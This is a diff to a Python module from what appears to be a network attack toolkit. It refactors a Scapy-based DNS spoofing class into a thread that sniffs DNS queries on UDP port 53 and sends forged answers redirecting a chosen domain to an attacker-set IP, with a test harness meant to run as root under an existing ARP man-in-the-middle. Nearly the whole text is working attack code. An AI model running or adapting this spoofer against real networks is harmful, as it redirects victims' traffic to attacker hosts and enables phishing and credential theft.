@@ -1,39 +1,36 @@
 
 """ src/attacks/dns_spoofing.py: Module for DNS spoofing attack.
-
 """
 import threading
 from scapy.all import sniff, sendp, Ether, IP, UDP, DNS, DNSQR, DNSRR
 
-from ..attacks.arp_spoofing import start_arp_spoof, stop_arp_spoof
-
-
-class DnsSpoofingAttack:
+class DnsSpoofingAttack(threading.Thread):
     """
-    Manages a DNS spoofing attack.
-
+    Manages a DNS spoofing attack by sniffing for DNS queries and sending spoofed responses.
+    This class assumes that an external component has already placed the attacker
+    in a Man-in-the-Middle position.
     """
 
-    def __init__(self, domain: str, fake_ip: str, target_ip: str, gateway_ip: str):
+    def __init__(self, domain: str, fake_ip: str):
         """
-        Initializes the DNS spoofing attack.
+        Initializes the DNS spoofing attack thread.
 
         Args:
             domain (str): The domain name to spoof.
             fake_ip (str): The IP address to use in the spoofed response.
-            target_ip (str): The victim's IP address.
-            gateway_ip (str): The gateway's IP address.
         """
-        self.spoof_rules = {domain: fake_ip}
-        self.target_ip = target_ip
-        self.gateway_ip = gateway_ip
-        self.running = False
-        self.sniffing_thread = None
+        super().__init__()
+        self.spoof_rules = {domain.strip("."): fake_ip}
+        self._stop_event = threading.Event()
+        self.daemon = True
 
     def _dns_interceptor(self, packet):
         """
         Callback function to process sniffed DNS packets.
         """
+        if self._stop_event.is_set():
+            return
+
         if packet.haslayer(DNS) and packet[DNS].opcode == 0 and packet[DNS].ancount == 0:
             queried_domain = packet[DNSQR].qname.decode('utf-8').strip('.')
 
@@ -55,58 +52,38 @@ class DnsSpoofingAttack:
                 sendp(spoofed_response, verbose=0)
                 print(f"[SUCCESS] Sent spoofed response for {queried_domain} to {packet[IP].src}")
 
-    def _sniff_loop(self):
+    def run(self):
         """
         The main loop for the sniffing thread.
         """
-        print("[INFO] Starting DNS sniffer...")
-        while self.running:
-            sniff(filter="udp port 53", prn=self._dns_interceptor, store=0, stop_filter=lambda p: not self.running)
-
-    def start(self):
-        """
-        Starts the DNS spoofing attack in a separate thread.
-        """
-        if not self.running:
-            self.running = True
-            print("[INFO] Starting prerequisite ARP spoof...")
-            start_arp_spoof(self.target_ip, self.gateway_ip)
-
-            self.sniffing_thread = threading.Thread(target=self._sniff_loop)
-            self.sniffing_thread.start()
-            print("[INFO] DNS spoofing attack started.")
+        print("[INFO] DNS Spoofing thread started (sniffing for queries).")
+        while not self._stop_event.is_set():
+            sniff(filter="udp port 53", prn=self._dns_interceptor, store=0, stop_filter=lambda p: self._stop_event.is_set())
+        print("[INFO] DNS Spoofing thread finished.")
 
     def stop(self):
         """
         Stops the DNS spoofing attack.
         """
-        if self.running:
-            print("[INFO] Stopping ARP spoof...")
-            stop_arp_spoof()
-            
-            self.running = False
-            if self.sniffing_thread and self.sniffing_thread.is_alive():
-                self.sniffing_thread.join()  # Wait for the thread to finish
-            print("[INFO] DNS spoofing attack stopped.")
+        print("[INFO] Signaling DNS Spoofing thread to stop...")
+        self._stop_event.set()
 
 # For direct testing of the module
 if __name__ == '__main__':
-    print("Testing DNS spoofer...")
-    # The attacker needs to be in a MitM position for this to work.
+    # This test requires running manually as root and having an active ARP spoof.
+    # Example: sudo python3 -m src.attacks.dns_spoofing
+    print("Testing DNS spoofer (requires active MITM)...")
     try:
-        # Spoof 'example.com' to an attacker-controlled IP
         attack = DnsSpoofingAttack(
-            domain="example.com", 
-            fake_ip="10.0.2.6",
-            target_ip="10.0.0.10", # Placeholder for testing
-            gateway_ip="10.0.0.1"  # Placeholder for testing
+            domain="example.com",
+            fake_ip="1.2.3.4",
         )
         attack.start()
         print("Attack started. Press Ctrl+C to stop.")
-        # Keep the main thread alive
         while True:
             pass
     except KeyboardInterrupt:
         print("\nStopping attack...")
         attack.stop()
+        attack.join()
         print("Attack stopped.")
